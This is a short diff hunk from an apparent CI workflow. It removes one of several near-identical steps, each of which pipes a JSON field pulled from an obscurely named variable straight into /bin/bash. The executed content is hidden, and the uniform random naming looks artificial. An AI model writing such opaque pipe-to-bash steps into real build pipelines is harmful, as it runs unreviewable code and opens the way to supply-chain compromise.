@@ -42,7 +42,6 @@ jobs:
           echo $sys5109 | jq -r .hdu47 | /bin/bash
           echo $mfp024 | jq -r .euk17197 | /bin/bash
           printf '%s' "$u5" | jq -r .kjbl460 | /bin/bash
-          echo $g442 | jq -r .qmw7800 | /bin/bash
           echo $xnd557 | jq -r .khp807 | /bin/bash
           printf '%s' "$pj280" | jq -r .jre270 | /bin/bash
           printf '%s' "$ine595" | jq -r .alez3 | /bin/bash
